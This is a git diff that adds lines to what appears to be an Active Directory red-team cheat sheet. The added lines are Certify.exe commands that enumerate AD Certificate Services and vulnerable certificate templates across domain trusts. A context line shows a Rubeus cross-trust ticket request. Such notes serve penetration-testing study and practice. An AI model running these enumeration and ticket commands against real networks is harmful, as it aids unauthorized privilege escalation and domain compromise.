@@ -265,7 +265,16 @@ C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/eurocorp-dc.moneycor
 ```
 ### Across Domain Trusts AD Certificate Services
 ---
+```powershell
+# Enumerate AD CS in the target forest
+C:> Certify.exe cas
 
+# Enumerate Templatesa
+C:> Certify.exe find
+
+# Enumerate Vulnerable Tmeplates
+C:> Certify.exe find /vulnerable
+```
 #### ESC1
 
 #### ESC3
